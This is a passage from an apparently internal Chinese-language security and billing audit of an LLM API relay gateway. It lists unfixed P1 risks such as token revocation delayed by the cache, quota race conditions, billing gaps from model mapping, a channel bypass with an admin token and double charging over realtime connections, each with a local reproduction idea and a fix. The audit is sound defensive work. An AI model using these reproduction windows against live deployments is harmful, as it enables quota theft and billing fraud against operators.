  - `model/token_cache.go:52-64`：缓存命中后直接返回 token 对象
  - `model/token.go:286-299`：`Update` 成功后异步 `cacheSetToken`
  - `model/token.go:317-329`：`Delete` 成功后异步 `cacheDeleteToken`
  - `model/token.go:442-473`：批量删除事务提交后异步逐个删除缓存，删除错误被忽略
  - `middleware/auth.go:332-349`：`TokenAuth` 依赖 `ValidateUserToken` 的结果
- 可能后果：用户删除或禁用泄露 token 后，该 token 仍可能在 Redis TTL 内继续调用模型；批量删除时某些 key 缓存删除失败也不会反馈给用户。运营上“已经撤销 token”的动作不能保证立即生效。
- 复现思路：本地启用 Redis，先让 token 被缓存，再删除 token，同时模拟 `cacheDeleteToken` 失败或阻断 Redis 写；继续用旧 key 调用 relay，观察是否仍从缓存通过。
- 修复建议：删除/禁用/批量删除必须同步删除缓存并把失败返回给调用方；或在 token 缓存中加入 version/revoked_at，每次鉴权校验用户/token 版本。应急撤销需要强一致路径，不能只依赖 TTL。
- 优先级：P1
- 当前状态：已确认 token DB 状态变更后的缓存失效为异步且失败不影响成功响应，尚未修复。

### 风险 84：token 额度扣减的 Redis 缓存更新异步且错误被忽略，额度校验可能使用旧 RemainQuota 造成超额调用

- 标题：`DecreaseTokenQuota`/`IncreaseTokenQuota` 在 Redis enabled 时异步 HINCRBY 缓存；失败只写日志，而鉴权和预扣会优先读取 Redis token
- 影响范围：有限额度 token、并发请求、批量扣费队列、预扣/退款、token used_quota/remain_quota 对账、子账号预算控制
- 触发条件：Redis 启用；有限额度 token 快耗尽；并发请求或高频请求；缓存 HINCRBY 失败/延迟；DB 批量更新开启导致主库也延迟落账
- 涉及文件/函数：
  - `model/token.go:375-392`：增加 token 额度时异步更新 Redis，错误只写系统日志
  - `model/token.go:405-421`：扣减 token 额度时异步更新 Redis，错误只写系统日志
  - `model/token_cache.go:30-40`：缓存只改 `remain_quota`
  - `service/quota.go:392-399`：预扣前从 `GetTokenByKey` 读 token 并检查 `RemainQuota`
  - `middleware/auth.go:417-419`：认证时把缓存中的 `RemainQuota` 放入 context
  - `service/pre_consume_quota.go:47-67`、`service/billing_session.go:293-300`：信任额度判断也依赖 token quota 或 unlimited 状态
- 可能后果：Redis 中 token remain_quota 没有及时减少时，多个请求都认为 token 额度充足，继续通过预扣；最后 DB 批量落账可能把 token 扣成负数或与用户钱包/订阅用量不一致。有限预算 token 失去预算上限意义。
- 复现思路：本地启用 Redis 和批量更新，构造小额度 token，模拟 Redis HINCRBY 失败或延迟后并发请求；观察预扣是否重复读取旧额度。
- 修复建议：有限 token 的额度扣减应使用 Redis 原子脚本或 DB 条件更新：`remain_quota >= quota` 才扣减，并同步返回失败；缓存和 DB 之间需要单一权威来源。退款/补偿也要记录流水，避免只调 HINCRBY。
- 优先级：P1
- 当前状态：已确认 token 额度缓存异步更新且错误不阻断，尚未修复。

### 风险 86：渠道模型映射后，token 模型限制和计费仍主要按用户请求的原始模型计算，可能产生上游成本与用户扣费不一致

- 标题：`ModelMappedHelper` 把请求发送给 `UpstreamModelName`，但普通 relay 的价格、倍率、token allowlist、渠道选择都先围绕 `OriginModelName` 完成
- 影响范围：渠道模型映射、模型别名、低价/免费模型、贵价上游模型、客户 token 模型白名单、渠道成本核算、消费日志对账
- 触发条件：管理员在渠道上配置 `model_mapping`，例如把用户可见的低价/免费别名映射到高价上游模型；或把 token 允许的模型名映射到 token 不应访问的上游模型；请求正常通过分发和预扣费后再由 relay helper 修改上游模型
- 涉及文件/函数：
  - `middleware/distributor.go:57-77`：token 模型限制现在会在分发器中校验，但校验对象是 `modelRequest.Model`
  - `middleware/distributor.go:132-138`、`model/channel_cache.go:97-116`：渠道选择也按请求模型查找可用渠道
  - `controller/relay.go:153-165`：普通 relay 在进入 handler、执行模型映射前已经按 `OriginModelName` 计算预扣费
  - `relay/helper/model_mapped.go:29-79`：渠道映射会把 request model 改成 `info.UpstreamModelName`
  - `relay/helper/price.go:67-120`、`166-224`：同步和按次计费价格均按 `info.OriginModelName` 取模型价格/倍率
  - `service/log_info_generate.go:262-264`：消费日志会记录 `is_model_mapped` 和 `upstream_model_name`，但这只是审计信息，不参与价格修正
- 可能后果：运营配置一个“便宜别名 -> 昂贵上游”的映射后，用户按便宜模型扣费但真实渠道按贵价模型付费；反向映射则可能导致用户被贵价计费但实际收到低价模型。token 的模型限制也可能只限制了别名，而没有限制最终上游模型。
- 复现思路：本地配置一个渠道，将低价模型别名映射到高价上游模型；用只允许低价别名的 token 请求该别名；检查请求是否发往上游高价模型，同时消费记录和预扣费是否仍按别名价格/倍率计算。
- 修复建议：明确模型映射的计费语义。若按上游模型计费，应在 `ModelMappedHelper` 后重新校验 token allowlist、渠道能力和价格；若按别名计费，应在渠道配置页展示“该映射按别名计费”的成本风险，并增加成本差异预警。消费日志中同时保存原始模型、上游模型、计费模型三个字段。
- 优先级：P1
- 当前状态：已确认模型映射发生在 handler 内，普通预扣费和初始分发校验发生在映射前；尚未修复。

### 风险 87：管理员 API token 指定渠道路径会跳过 token 模型限制和常规渠道分组/模型匹配校验

- 标题：admin token 使用额外 key 分段指定 `specific_channel_id` 时，`Distribute` 只校验渠道存在且启用，不走普通分发分支
- 影响范围：管理员 token 泄露、指定渠道调试、渠道隔离、模型白名单、分组成本控制、上游密钥使用范围
- 触发条件：管理员 API token 泄露或被脚本长期持有；请求携带额外 key 分段指定某个渠道 id；该渠道处于启用状态，但不一定为当前 token group/模型开放
- 涉及文件/函数：
  - `middleware/auth.go:427-432`：管理员 token 可通过额外 key 分段设置 `specific_channel_id`，普通用户会被拒绝
  - `middleware/distributor.go:35-55`：指定渠道分支只解析渠道 id、加载渠道、检查 `Status == enabled`
  - `middleware/distributor.go:57-77`：token 模型限制校验位于非指定渠道的 `else` 分支，指定渠道不会执行
  - `middleware/distributor.go:79-138`、`model/channel_satisfy.go:8-31`：普通路径会按 group/model 找可用渠道，指定渠道路径不会调用这些匹配逻辑
  - `controller/relay.go:181-185`：后续 retryParam 仍记录 token group 和 origin model，但初始指定渠道已经绕过了普通选择约束
- 可能后果：管理员 token 一旦泄露，攻击者不仅可调用管理员余额，还能强制打到任意启用渠道，绕过模型限制、分组渠道隔离和部分成本路由策略。即使这是为了调试，也会扩大 admin token 的 blast radius。
- 复现思路：本地使用管理员 token 的指定渠道格式请求一个该渠道未对当前 group/model 开放的模型；观察分发器是否仍设置该渠道上下文并进入 relay。
- 修复建议：保留指定渠道能力时也应执行 token 模型限制、渠道是否支持请求模型、渠道是否允许当前 token group 的校验；或把指定渠道限定为后台调试接口，要求 dashboard step-up、短期一次性令牌和审计原因。
- 优先级：P1
- 当前状态：已确认指定渠道分支绕过普通 token/model/group 分发校验，尚未修复。

### 风险 89：auto group 重试切到新分组后只更新 `PriceData.GroupRatioInfo`，不会重新预留更高分组倍率所需额度

- 标题：普通 relay 在初次选渠后先按当前 group 预扣费；后续 retry 切换 auto group 时只刷新 group ratio，最终补扣失败只记录日志
- 影响范围：auto group 跨组重试、低价组到高价组切换、用户余额临界值、订阅额度、token 有限额度、补扣对账
- 触发条件：请求初始选择低倍率 group 并完成预扣；上游失败触发 retry；auto group 切到更高倍率 group；实际结算额度高于预扣额度；用户余额、订阅或 token 剩余额度不足以补扣差额
- 涉及文件/函数：
  - `controller/relay.go:153-165`：预扣费发生在 relay retry 循环之前
  - `controller/relay.go:190-220`：请求失败后会进入重试循环
  - `controller/relay.go:306-318`：retry 重新选渠后只调用 `helper.HandleGroupRatio` 更新 `PriceData.GroupRatioInfo`
  - `service/channel_select.go:137-148`：auto group 在跨组 retry 时会推进分组
  - `service/billing.go:34-58`：最终按 `actualQuota - preConsumed` 做补扣
  - `service/text_quota.go:427-429`、`service/quota.go:350-352`：后结算失败只写日志，不会改变已经返回给客户端的成功响应
- 可能后果：请求最终成功使用了高倍率分组，但用户余额或 token 额度不足以补扣差额时，系统只记录 `error settling billing`，用户仍拿到成功结果。运营上形成“低价组预扣、失败后高价组出结果、补扣失败”的成本缺口。
- 复现思路：本地设置两个 auto group，低价组先被选中但上游返回可重试错误，高价组随后成功；让用户余额只够低价预扣、不够高价实际扣费；观察成功响应后是否只有日志报错而没有完整扣费。
- 修复建议：retry 切换 group 后若倍率升高，应调用 `BillingSession.Reserve` 或等价逻辑提前补预留差额，失败则停止重试并退款；后结算失败不应只写日志，至少要记录待补扣账单、冻结用户/token 或进入补扣队列。
- 优先级：P1
- 当前状态：已确认重试切组后没有重新预留差额，且 post settle 错误仅日志化，尚未修复。

### 风险 90：后结算补扣失败不会让成功调用回滚或生成强制待补扣状态，可能形成“调用成功但未扣足费”

- 标题：`PostTextConsumeQuota` 和 `PostAudioConsumeQuota` 调用 `SettleBilling` 后只记录错误，钱包扣减本身也没有 `quota >= delta` 条件
- 影响范围：文本/音频/图片等同步 relay、信任额度、web search 附加费用、usage 超预估、模型映射成本差异、用户余额负数、运营对账
- 触发条件：实际 usage、附加计费或重试后的 group ratio 导致 `actualQuota > preConsumed`；补扣时数据库失败、订阅额度不足、token 额度不足、批量更新/缓存异常；或钱包直接被扣成负数后未被阻断
- 涉及文件/函数：
  - `service/billing.go:34-58`：后结算只把 `Billing.Settle(actualQuota)` 的错误返回给调用者
  - `service/text_quota.go:419-429`：文本后结算失败仅 `logger.LogError`
  - `service/quota.go:337-352`：音频后结算失败同样仅 `logger.LogError`
  - `service/funding_source.go:47-54`：钱包补扣调用 `model.DecreaseUserQuota`
  - `model/user.go:1034-1052`：`DecreaseUserQuota` 是 `quota = quota - ?`，没有 `quota >= ?` 条件；启用 batch update 时还会先写批量记录
  - `service/quota.go:432-440`：token 后扣费失败也只作为 settle 错误向上返回，最终仍可能只被日志吞掉
- 可能后果：用户在余额临界、订阅临界或 token 额度临界时完成一次调用，但补扣未成功或把钱包扣成负数。若批量更新/缓存延迟叠加，运营侧可能需要事后人工追账；攻击者可围绕超预估 usage、附加费用或重试切组寻找未扣足费窗口。
- 复现思路：本地构造实际 usage 高于预扣的请求，或启用 web search 附加费用；让用户余额/订阅只够预扣不够补扣；观察客户端是否仍获得成功响应，后台是否仅出现 settle error 或负余额。
- 修复建议：补扣应有强一致账务状态：钱包扣减使用条件更新 `quota >= delta`，失败则生成待补扣记录并限制后续调用；同步 relay 成功响应前无法回滚上游结果时，也必须把未结清状态持久化并进入告警/追缴流程。对信任额度、auto group、附加费用统一调用提前 reserve。
- 优先级：P1
- 当前状态：已确认 post settle 失败被日志化，钱包扣减没有余额条件，尚未修复。

### 风险 91：realtime WebSocket 过程内增量扣费后，结束时又按总 usage 走最终结算，可能重复扣费

- 标题：`preConsumeUsage` 每次 response.done 或本地 usage flush 都调用 `PreWssConsumeQuota` 直接扣费；`WssHelper` 结束后又调用 `PostWssConsumeQuota` 对 `sumUsage` 做 `SettleBilling`
- 影响范围：OpenAI realtime/WebSocket、长连接语音会话、用户余额、token 额度、订阅额度、消费日志、渠道成本统计
- 触发条件：用户通过 `/v1/realtime` 建立 WebSocket；会话中产生一个或多个 `response.done` usage 或本地估算 usage；`PreWssConsumeQuota` 成功调用 `PostConsumeQuota` 扣费；连接结束后 `PostWssConsumeQuota` 再按累计 usage 结算
- 涉及文件/函数：
  - `relay/websocket.go:38-44`：`DoResponse` 返回 usage 后无条件调用 `service.PostWssConsumeQuota`
  - `relay/channel/openai/adaptor.go:628-631`：realtime 的 `DoResponse` 实际进入 `OpenaiRealtimeHandler`
  - `relay/channel/openai/relay-openai.go:870-887`：收到上游 `response.done` usage 后累加 usage 并调用 `preConsumeUsage`
  - `relay/channel/openai/relay-openai.go:958-963`：连接结束前还会把未 flush 的 usage 再调用 `preConsumeUsage`
  - `relay/channel/openai/relay-openai.go:971-986`：`preConsumeUsage` 先累加到 `totalUsage`，再调用 `service.PreWssConsumeQuota`
  - `service/quota.go:89-153`：`PreWssConsumeQuota` 计算当前段 quota 后直接调用 `PostConsumeQuota`
  - `service/quota.go:157-230`：`PostWssConsumeQuota` 又按总 usage 计算 quota 并调用 `SettleBilling`
- 可能后果：同一段 realtime usage 先在流式过程中被扣一次，结束时又被作为总 usage 参与结算。若普通 relay 入口已有初始 BillingSession 预扣费，最终实际账务可能变成“初始预扣 + 过程扣费 + 最终补扣/退款”，导致用户被重复扣费或账单与日志难以对齐。
- 复现思路：本地用 realtime 模型建立 WebSocket，产生一次 `response.done` 且上游返回 usage；记录用户 quota/token quota 在 `PreWssConsumeQuota` 后和连接关闭后 `PostWssConsumeQuota` 后的变化，比较是否超过一次总 usage 应扣额度。
- 修复建议：把 realtime 过程内逻辑改为 `BillingSession.Reserve` 或只做额度预留，不直接 `PostConsumeQuota`；最终 `PostWssConsumeQuota` 只结算未扣差额。或者过程内已扣费时，最终只记录日志和统计，不再对同一 usage 调用 `SettleBilling`。
- 优先级：P1
- 当前状态：已确认 realtime 过程内直接扣费与结束后总 usage 结算并存，尚未修复。

### 风险 92：realtime 增量扣费判断固定价格模型时读取 `relayInfo.UsePrice`，但价格计算只写入 `PriceData.UsePrice`

- 标题：`PreWssConsumeQuota` 用 `relayInfo.UsePrice` 判断是否跳过增量扣费，而当前价格 helper 没有同步设置该字段
- 影响范围：配置为 fixed price 的 realtime 模型、同时存在模型倍率和模型价格的模型、免费/固定价模型、实时语音增量扣费
- 触发条件：realtime 模型通过 `ModelPriceHelper` 得到 `PriceData.UsePrice=true`；`relayInfo.UsePrice` 仍为默认 false；流式过程中 `PreWssConsumeQuota` 未跳过增量扣费，继续按 `GetModelRatio` 和音频 token 公式计算当前段费用
- 涉及文件/函数：
  - `relay/common/relay_info.go:103`：`RelayInfo` 有独立的 `UsePrice` 字段
  - `relay/helper/price.go:142-162`：价格计算只写 `types.PriceData{UsePrice: usePrice}` 到 `info.PriceData`
  - `service/quota.go:89-92`：realtime 增量扣费以 `relayInfo.UsePrice` 为跳过条件
  - `service/quota.go:103-140`：未跳过时按 `OriginModelName` 的 model ratio 和 audio token 计算 quota
  - `service/quota.go:182-185`：最终 `PostWssConsumeQuota` 则读取 `relayInfo.PriceData.UsePrice`
- 可能后果：固定价 realtime 模型在流式过程中仍可能被按倍率增量扣费，结束时又按固定价总账单结算。若模型价格和倍率同时配置，会形成额外扣费；若只配置价格、倍率缺失或为 0，则过程内扣费为 0、最终才扣，行为与代码意图不一致。
- 复现思路：本地配置一个 fixed price realtime 模型，并确保同名模型倍率存在；建立 realtime 会话产生 usage；观察 `PreWssConsumeQuota` 是否仍执行并扣除按倍率计算的 quota。
- 修复建议：删除 `RelayInfo.UsePrice` 或在 `ModelPriceHelper` 中同步设置；`PreWssConsumeQuota` 应使用 `relayInfo.PriceData.UsePrice`，并与最终结算共享同一个价格快照，避免 fixed price 和 ratio price 混用。
- 优先级：P1
- 当前状态：已确认 `relayInfo.UsePrice` 未见写入点，realtime 增量扣费读取的是该未同步字段，尚未修复。

### 风险 93：realtime 每段 usage 的用户/token 额度校验是先查后扣，多会话并发可能超额或扣成负数

- 标题：`PreWssConsumeQuota` 每段先读 user quota 和 token remain，再调用非条件扣减；多个长连接并发没有统一额度锁或原子条件更新
- 影响范围：realtime 长连接、多个浏览器/客户端同时会话、有限额度 token、余额临界用户、订阅/钱包混合计费、Redis/token 缓存一致性
- 触发条件：同一用户或同一有限 token 同时开启多个 realtime WebSocket；每个连接分段产生 usage；各连接在扣费前读到相同或延迟的 user/token quota；随后分别调用扣减
- 涉及文件/函数：
  - `service/quota.go:93-99`：每段扣费前分别读取用户余额和 token
  - `service/quota.go:141-147`：额度不足判断只基于读取到的快照
  - `service/quota.go:149`：判断通过后调用 `PostConsumeQuota`
  - `service/quota.go:420-440`：`PostConsumeQuota` 对钱包和 token 分别调用扣减函数
  - `model/user.go:1034-1052`：用户余额扣减是 `quota = quota - ?`，没有 `quota >= ?` 条件
  - `model/token.go:405-421`：token quota 扣减还会异步更新 Redis 缓存，上一轮风险 84 已记录缓存延迟可放大该问题
- 可能后果：多个 realtime 会话在余额临界时都通过检查，最终把用户余额或 token 额度扣成负数，或者某些扣减失败后仅被日志记录。攻击者可用多连接和小段音频/文本 usage 放大“先查后扣”的窗口。
- 复现思路：本地给用户和 token 设置刚好够一次 realtime usage 的额度，并发开启多个 WebSocket 会话同时发送音频；观察各会话是否都通过 `PreWssConsumeQuota`，最终 user quota/token remain 是否为负或与总 usage 不一致。
- 修复建议：realtime 分段扣费应使用同一 BillingSession 的原子 reserve；钱包和 token 扣减都应使用条件更新或 Redis Lua 原子扣减，确保 `remain >= delta`。多个 WebSocket 连接需要按 user/token 维度共享预算锁或强一致额度账本。
- 优先级：P1
- 当前状态：已确认 realtime 分段扣费是先查后扣，尚未修复。

### 风险 94：原生 Responses SSE 收到 `response.error`/`response.failed` 时未转成 relay 错误，可能按本地估算结算失败请求

- 标题：`OaiResponsesStreamHandler` 只处理 `response.completed`、文本 delta 和部分 item.done，未像 chat-via-responses 一样把 `response.error`/`response.failed` 转为 `NewAPIError`
- 影响范围：`/v1/responses` 流式请求、Responses 内置工具、上游中途失败、预扣费退款、失败日志、用户投诉对账
- 触发条件：Responses 上游以 SSE 返回若干 delta 后发送 `response.failed` 或 `response.error`；或没有 completed usage 但已经输出部分文本；handler 扫描结束后没有返回错误
- 涉及文件/函数：
  - `relay/channel/openai/relay_responses.go:82-131`：Responses 流 handler 解析事件并发送给客户端，但 switch 未处理 `response.error`/`response.failed`
  - `relay/channel/openai/relay_responses.go:133-149`：没有上游 usage 时按已累积文本和预估 prompt 本地计算 usage 并返回成功
  - 对比证据：`relay/channel/openai/chat_via_responses.go:498-507`：chat-via-responses 对 `response.error`/`response.failed` 会构造错误并 `sr.Stop`
  - `relay/compatible_handler.go:211-225`：`DoResponse` 未返回错误时会继续调用 `PostTextConsumeQuota` 或 `PostAudioConsumeQuota`
- 可能后果：上游实际失败的 Responses 流可能被记录为一次成功调用并按本地 token 估算扣费；如果上游失败但已有部分输出，用户可能既拿到错误事件又被扣费，运营侧缺少明确失败退款/争议处理状态。
- 复现思路：本地构造一个 Responses SSE mock：先发送 `response.output_text.delta`，再发送 `response.failed`；观察 handler 是否返回错误并触发退款，还是按本地 usage 扣费并记录成功消费日志。
- 修复建议：原生 Responses 流应与 chat-via-responses 对齐，显式处理 `response.error`/`response.failed`，把上游错误转换为 `NewAPIError`；若已经向客户端输出部分内容，需要定义“部分失败是否扣费”的策略，并在日志中标记 partial_failed、upstream_error_code、是否退款。
- 优先级：P1
- 当前状态：已确认原生 Responses 流未处理失败事件，尚未修复。

### 风险 96：渠道 `status_code_mapping` 可把上游错误改成 2xx/异常状态码，并影响内部重试和自动禁用策略

- 标题：后端 `ResetStatusCode` 只做 JSON 解析和整数转换，不校验目标状态码范围；映射后的状态码会继续参与 `shouldRetry`、`ShouldDisableChannel` 和最终客户端响应
- 影响范围：渠道错误重试、自动禁用、错误日志、客户端 SDK 成功/失败判断、上游 401/429/5xx 成本路由、管理员渠道配置
- 触发条件：管理员或被盗后台 session 修改渠道 `status_code_mapping`，例如把 `401/429/500` 映射为 `200`、`204`、`0` 或其它非标准状态码；上游随后返回对应错误
- 涉及文件/函数：
  - `service/error.go:133-155`：`ResetStatusCode` 根据渠道配置直接覆盖 `newApiErr.StatusCode`
  - `service/error.go:158-184`：`parseStatusCodeMappingValue` 接受 string/number/int，但不要求 100-599
  - `relay/compatible_handler.go:194-215`、`relay/responses_handler.go:122-138`、`relay/audio_handler.go:51-67` 等：handler 在返回错误前调用 `ResetStatusCode`
  - `controller/relay.go:228-234`：controller 使用已经映射过的错误做 channel error 处理和 retry 判断
  - `controller/relay.go:343-353`：`shouldRetry` 对 2xx 直接不重试，对非 100-599 又当可重试，语义会被映射值改变
  - `service/channel.go:45-64`：自动禁用按映射后的 `StatusCode` 和错误文本判断
  - 前端对比：`web/default/src/features/channels/lib/status-code-risk-guard.ts:19-37` 有 100-599 校验和 504/524 风险提示，但 `controller/channel.go:457-513` 的后端 `validateChannel` 未校验 `status_code_mapping`
- 可能后果：错误渠道可被配置成“返回 200 的错误体”，客户端可能把失败当成功；上游 401/余额不足等本该禁用渠道的错误被映射后不触发自动禁用；本该重试的 429/5xx 被改成 2xx 后停止重试。反过来，映射到非标准码可能造成异常重试或响应写入问题。
- 复现思路：本地创建渠道并设置 `status_code_mapping={"401":200,"500":200}`，让 mock upstream 返回 401/500；观察最终 HTTP 状态、`shouldRetry` 是否停止、`ShouldDisableChannel` 是否不再按 401 禁用。
- 修复建议：后端保存渠道时校验 `status_code_mapping`：key/value 必须是 100-599；禁止映射到 2xx，或至少要求单独高危开关并且内部 retry/auto-ban 使用原始上游状态码。错误日志中同时记录 `upstream_status_code` 和 `mapped_status_code`。
- 优先级：P1
- 当前状态：已确认状态码映射缺少后端强校验，且映射值会影响内部策略，尚未修复。

### 风险 97：失败请求的预扣退款异步 best-effort，退款失败只写系统日志，缺少可追踪补偿状态

- 标题：controller 在 `newAPIError != nil` 时调用 `Billing.Refund(c)`；`BillingSession.Refund` 立即标记 refunded，然后异步退资金和 token，失败不返回给请求链路也不落补偿表
- 影响范围：上游错误、渠道重试全部失败、客户端断开、敏感词/违规扣费以外的失败退款、钱包余额、订阅额度、token remain quota、客服对账
- 触发条件：请求已经完成预扣费；后续 relay 返回错误且需要退款；退款 goroutine 中 `funding.Refund()`、订阅 extra reserve 回滚或 `IncreaseTokenQuota` 失败；进程退出或异步任务未执行完成
- 涉及文件/函数：
  - `controller/relay.go:161-178`：普通 relay 预扣后在错误 defer 中调用 `relayInfo.Billing.Refund(c)`
  - `service/billing_session.go:81-122`：`Refund` 先设置 `s.refunded=true`，随后 `gopool.Go` 异步执行退款
  - `service/billing_session.go:107-120`：资金来源退款、订阅 extra reserve 回滚、token 退款失败都只 `SysLog`
  - `service/funding_source.go:57-63`：钱包退款是非幂等 `IncreaseUserQuota`，注释说明不能重试
  - `service/funding_source.go:111-117`：订阅预扣退款依赖 `RefundSubscriptionPreConsume`
  - `controller/relay.go:173-177`：退款后还可能继续执行违规扣费逻辑，但退款本身没有确认结果
- 可能后果：用户一次失败请求仍被扣住预扣额度；token remain quota 或订阅 used amount 没有回滚。由于 session 已标记 `refunded=true`，同一次请求内不会再次尝试；系统也没有“退款失败待补偿”记录，运营只能从系统日志人工追查。
- 复现思路：本地构造预扣成功后上游失败的请求，模拟 `IncreaseUserQuota` 或 `IncreaseTokenQuota` 返回错误；观察客户端收到失败响应后，预扣余额/token 是否未恢复且数据库中没有待退款记录。
- 修复建议：失败退款应同步完成或写入幂等退款/补偿流水。钱包退款需要 requestId 级幂等记录，允许安全重试；异步失败要持久化为 pending_refund，并在后台任务重试和告警。响应前至少确认退款任务已入库。
- 优先级：P1
- 当前状态：已确认退款是异步 best-effort，失败只写系统日志，尚未修复。

### 风险 98：后结算中资金来源调整成功但 token 额度调整失败时，会标记 settled，导致有限 token 预算与实际扣费脱节

- 标题：`BillingSession.Settle` 先调整钱包/订阅，再调整 token；token 调整失败只返回错误并标记 `settled=true`，上层多数路径仅日志记录
- 影响范围：有限额度 token、钱包/订阅后补扣和退款、auto group 切组补扣、usage 超预估、token used/remain 对账、客户预算隔离
- 触发条件：实际消耗与预扣不一致，`delta != 0`；资金来源 `funding.Settle(delta)` 成功；随后 `DecreaseTokenQuota` 或 `IncreaseTokenQuota` 失败；调用方没有阻断成功响应或补偿 token 状态
- 涉及文件/函数：
  - `service/billing_session.go:41-58`：`Settle` 先执行资金来源调整，并设置 `fundingSettled=true`
  - `service/billing_session.go:59-78`：token 调整失败只 `SysLog`，随后仍设置 `s.settled=true` 并返回 `tokenErr`
  - `service/billing_session.go:132-136`：`fundingSettled` 或 `settled` 后不再允许普通 Refund 回退资金来源
  - `service/billing.go:34-58`：`SettleBilling` 返回该错误
  - `service/text_quota.go:427-429`、`service/quota.go:350-352`：同步文本/音频路径只记录 `error settling billing`
  - `model/token.go:405-421`：token 扣减还会异步更新 Redis 缓存，失败窗口会放大 token 预算不一致
- 可能后果：钱包或订阅已按实际 usage 结算，但 token 预算没有相应扣减/退还。有限额度 token 可能继续显示额度充足并允许后续调用，或退款场景中 token remain 未恢复，造成客户预算与真实资产账本不一致。
- 复现思路：本地让一次请求实际 usage 高于预扣，模拟 `model.DecreaseTokenQuota` 失败；观察用户钱包已补扣，但 token remain/used 没变，日志只有 settle error，后续请求仍按旧 token 额度判断。
- 修复建议：资金来源和 token 额度应在同一账务事务/流水中提交，或至少 token 调整失败时持久化 pending_token_delta 并阻断该 token 后续使用直到修复。`Settle` 不应在 token 调整失败后简单标记 settled 完成。
- 优先级：P1
- 当前状态：已确认资金来源与 token 后结算不是原子提交，失败缺少持久补偿，尚未修复。

### 风险 99：渠道创建/更新后端没有统一校验 `model_mapping`、`status_code_mapping`、param/header override，绕过前端可写入高风险配置

- 标题：前端提交前校验模型映射 JSON、缺失模型和状态码映射风险；后端 `validateChannel` 只校验 setting、key、模型名长度和少数渠道类型
- 影响范围：管理员渠道配置、模型映射计费、状态码映射重试/禁用、请求参数覆盖、请求头覆盖、前端限制与后端真实校验一致性
- 触发条件：管理员通过 API、旧前端、脚本或被盗 session 直接调用 `/api/channel` 创建/更新渠道；提交非法或高风险 `model_mapping`、`status_code_mapping`、`param_override`、`header_override`；前端本应阻止或提示，但后端接受
- 涉及文件/函数：
  - `controller/channel.go:457-513`：`validateChannel` 未校验 `model_mapping`、`status_code_mapping`、`param_override`、`header_override` 的 JSON 格式和语义
  - `controller/channel.go:587-602`：创建渠道只调用 `validateChannel`
  - `controller/channel.go:863-878`：更新渠道同样只调用 `validateChannel`
  - `model/channel.go:526-572`：`Update` 直接保存 channel 字段并重建 abilities
  - 前端对比：`web/default/src/features/channels/components/drawers/channel-mutate-drawer.tsx:954-975` 会校验状态码映射并提示高风险重定向
  - 前端对比：`web/default/src/features/channels/components/drawers/channel-mutate-drawer.tsx:978-1022` 会校验 `model_mapping` JSON 并提示缺失模型
  - 前端对比：`web/default/src/features/channels/lib/model-mapping-validation.ts:166-188` 要求模型映射为 JSON object
  - 前端 payload：`web/default/src/features/channels/lib/channel-form.ts:451-498` 会把这些字段直接发给后端
- 可能后果：直接 API 调用可写入非法 JSON，导致运行期 `ModelMappedHelper` 解析失败、请求全部失败并触发退款/重试；也可写入状态码映射到 2xx、危险 header/param override，放大风险 86、96。运营侧以为前端限制生效，但后端真实约束不足。
- 复现思路：本地绕过前端直接调用渠道更新接口，提交 `model_mapping="not-json"` 或 `status_code_mapping={"401":200}`；观察后端是否返回成功并在后续 relay 时触发映射错误或状态码策略变化。
- 修复建议：把前端校验迁移到后端统一执行：`model_mapping` 必须是 JSON object 且 key/value 非空字符串；`status_code_mapping` 必须是 100-599 且默认禁止映射到 2xx；param/header override 复用运行时 parser 做保存前校验。高风险配置要求二次验证和审计原因。
- 优先级：P1
- 当前状态：已确认渠道后端校验覆盖不足，尚未修复。

### 风险 100：按 tag 批量编辑渠道先更新 channel 表，再逐个重建 abilities；单个失败只写日志，可能导致路由能力表与渠道配置不一致

- 标题：`EditChannelByTag` 批量更新 models/group 后逐个 `UpdateAbilities(nil)`，某个 channel 能力重建失败不会回滚批量 channel 更新，也不会让接口失败
- 影响范围：批量编辑 tag、渠道模型/分组权限、`/v1/models` 可见模型、relay 渠道选择、auto group、渠道成本路由
- 触发条件：管理员批量编辑某个 tag 的 `models` 或 `groups`；channel 表更新成功；随后某个渠道的 abilities 删除/插入失败，或多实例/数据库异常导致部分能力重建失败
- 涉及文件/函数：
  - `controller/channel.go:776-820`：`EditTagChannels` 只校验 tag 和 override JSON，调用 `model.EditChannelByTag` 后刷新缓存并返回成功
  - `model/channel.go:799-832`：`EditChannelByTag` 先 `DB.Model(&Channel{}).Where("tag = ?", tag).Updates(updateData)` 批量更新 channel 表
  - `model/channel.go:836-845`：需要重建 abilities 时逐个 channel 调 `UpdateAbilities(nil)`，失败只 `SysLog`，没有返回错误
  - `model/ability.go:193-260`：单个 `UpdateAbilities` 会删除该 channel 旧 abilities 再插入新 abilities
  - `model/channel_cache.go:22-87`：后续 `InitChannelCache` 根据 channel 表重建内存路由缓存，但 DB abilities 表可能仍不一致
  - 对比证据：`model/channel.go:1023-1053` 的 `BatchSetChannelTag` 使用事务更新 channel 与 abilities，失败会 rollback
- 可能后果：channel 表显示某 tag 已切到新模型/新分组，但 abilities 表仍是旧数据或缺失部分数据；模型列表、渠道选择和权限判断可能与后台显示不一致。运营批量下线某模型/某分组后，实际 relay 仍可能按旧 abilities 路由，或相反导致可用渠道异常消失。
- 复现思路：本地对含多个渠道的 tag 执行批量 models/group 编辑，在某个 channel 的 `UpdateAbilities` 插入阶段注入错误；观察接口是否成功、channel 表是否已更新、abilities 是否部分旧/空。
- 修复建议：按 tag 批量编辑涉及 models/group 时必须在事务内锁定目标 channels，更新 channel 表和 abilities 表原子提交；任何 channel 能力重建失败都应回滚并返回错误。能力重建后增加校验：channel 表派生出的能力数量与 abilities 实际数量一致。
- 优先级：P1
- 当前状态：已确认批量 tag 编辑的 channel 更新和 abilities 重建不是整体原子操作，尚未修复。

### 风险 102：`TopupGroupRatio` 解析失败会先清空运行期充值分组倍率，充值价格临时退回默认 1

- 标题：充值分组倍率更新直接替换全局 map；非法 JSON 或类型错误会返回失败，但旧倍率已经被清空，后续充值按缺失组默认 1 计算
- 影响范围：Epay、Stripe、Waffo、Waffo Pancake 充值下单金额、Stripe 到账额度、VIP/SVIP 分组折扣或加价、后台倍率设置与真实充值价格一致性
- 触发条件：Root 管理员在前端 JSON 模式或直接 API 保存非法 `TopupGroupRatio`；配置导入/手工改库写入错误 JSON；多实例同步加载到坏值；或前端只校验 JSON 格式但后端未在保存前解析到临时变量
- 涉及文件/函数：
  - `controller/option.go:120-139`：通用设置入口把 value 转成字符串，未对 `TopupGroupRatio` 做专门预校验
